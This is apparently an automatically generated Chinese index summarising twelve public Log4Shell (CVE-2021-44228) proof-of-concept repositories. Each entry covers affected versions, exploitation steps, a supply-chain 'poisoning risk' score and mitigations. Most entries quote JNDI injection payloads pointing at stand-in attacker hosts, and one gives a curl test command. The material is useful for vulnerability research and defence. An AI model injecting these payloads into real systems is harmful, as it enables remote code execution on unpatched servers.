# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

